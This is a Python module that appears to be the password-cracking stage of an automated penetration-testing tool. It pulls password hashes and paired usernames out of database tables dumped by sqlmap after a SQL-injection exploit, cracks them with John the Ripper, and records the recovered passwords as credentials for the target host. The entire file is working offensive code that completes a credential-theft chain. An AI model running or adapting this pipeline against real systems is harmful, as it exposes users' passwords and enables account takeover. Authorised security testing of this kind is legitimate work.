"""Password cracking (OFFENSIVE) — the capstone of the SQLi extraction chain.

Harvests password hashes out of the CSV files sqlmap wrote during
``sqli_exploit`` (recorded as ``db-dump`` Loot), feeds them to John the Ripper,
and records anything cracked as a validated-material Credential.

Hash extraction is heuristic: it scans dumped cell values for well-known hash
shapes (bcrypt, MySQL, md5/sha1/sha256 hex) and tries to pair each with a
username-ish value in the same row.
"""

from __future__ import annotations

import csv
import re

from ..models import Credential, StageRun
from ..util import dedupe, write_lines
from .. import runner
from .base import Stage, StageContext

# Ordered most-specific first so an md5 regex can't swallow a bcrypt string.
HASH_PATTERNS = [
    ("bcrypt", re.compile(r"^\$2[aby]\$\d\d\$[./A-Za-z0-9]{53}$")),
    ("mysql",  re.compile(r"^\*[0-9A-Fa-f]{40}$")),
    ("sha256", re.compile(r"^[0-9a-fA-F]{64}$")),
    ("sha1",   re.compile(r"^[0-9a-fA-F]{40}$")),
    ("md5",    re.compile(r"^[0-9a-fA-F]{32}$")),
]
USER_HINT = re.compile(r"user|login|email|mail|name|account", re.IGNORECASE)


def _hash_kind(value: str) -> str | None:
    v = value.strip()
    for kind, pat in HASH_PATTERNS:
        if pat.match(v):
            return kind
    return None


class CrackStage(Stage):
    name = "crack"
    tools = ["john"]
    tier = "offensive"                  # gated behind --exploit
    depends_on = ["sqli_exploit"]

    def execute(self, ctx: StageContext, record: StageRun) -> str:
        dumps = [l for l in ctx.results.loot if l.kind == "db-dump" and l.path]
        if not dumps:
            return "no dumped data to crack"

        # hash -> best-guess username, gathered across every dump CSV.
        hashes: dict[str, str] = {}
        for loot in dumps:
            root = ctx.run_dir / loot.path
            if not root.exists():
                continue
            for csv_path in root.rglob("*.csv"):
                self._harvest(csv_path, hashes)
                if len(hashes) >= ctx.config.crack_max_hashes:
                    break

        if not hashes:
            return "no crackable hashes found in dumps"
        items = list(hashes.items())[: ctx.config.crack_max_hashes]

        sdir = ctx.stage_dir(self.name)
        hash_file = sdir / "hashes.txt"
        write_lines(hash_file, (h for h, _ in items))

        cmd = ["john"]
        if ctx.config.crack_format:
            cmd.append(f"--format={ctx.config.crack_format}")
        if ctx.config.crack_wordlist:
            cmd.append(f"--wordlist={ctx.config.crack_wordlist}")
        cmd.append(str(hash_file))
        runner.run(cmd, timeout=ctx.config.timeout_for(self.name),
                   log_dir=sdir, log_name="john")

        cracked = self._show(ctx, sdir, hash_file)
        user_of = dict(items)
        host = ctx.targets[0] if ctx.targets else ""
        for h, pw in cracked.items():
            ctx.results.credentials.append(Credential(
                host=host, service="db", username=user_of.get(h, ""),
                password=pw, source="crack", validated=False))

        record.produced = len(cracked)
        return f"{len(cracked)}/{len(items)} hash(es) cracked"

    def _harvest(self, csv_path, hashes: dict[str, str]) -> None:
        try:
            with csv_path.open(newline="", encoding="utf-8", errors="replace") as fh:
                reader = csv.reader(fh)
                rows = list(reader)
        except OSError:
            return
        if not rows:
            return
        header = rows[0]
        user_cols = [i for i, h in enumerate(header) if USER_HINT.search(h or "")]
        for row in rows[1:]:
            found = [(i, c) for i, c in enumerate(row) if _hash_kind(c)]
            for i, cell in found:
                username = self._pick_user(row, user_cols, skip=i)
                hashes.setdefault(cell.strip(), username)

    @staticmethod
    def _pick_user(row: list[str], user_cols: list[int], skip: int) -> str:
        for i in user_cols:
            if i != skip and i < len(row) and row[i].strip():
                return row[i].strip()
        # Fall back to the first non-hash, non-empty cell in the row.
        for i, c in enumerate(row):
            if i != skip and c.strip() and not _hash_kind(c):
                return c.strip()
        return ""

    @staticmethod
    def _show(ctx: StageContext, sdir, hash_file) -> dict[str, str]:
        cmd = ["john", "--show"]
        if ctx.config.crack_format:
            cmd.append(f"--format={ctx.config.crack_format}")
        cmd.append(str(hash_file))
        res = runner.run(cmd, timeout=300, log_dir=sdir, log_name="john_show")
        cracked: dict[str, str] = {}
        for line in res.lines():
            # `john --show` on bare hashes prints "<hash>:<password>".
            if ":" not in line or line.lower().endswith("cracked"):
                continue
            if re.search(r"\d+ password hash", line):  # summary line
                continue
            left, _, pw = line.partition(":")
            if _hash_kind(left) and pw:
                cracked[left.strip()] = pw
        return cracked
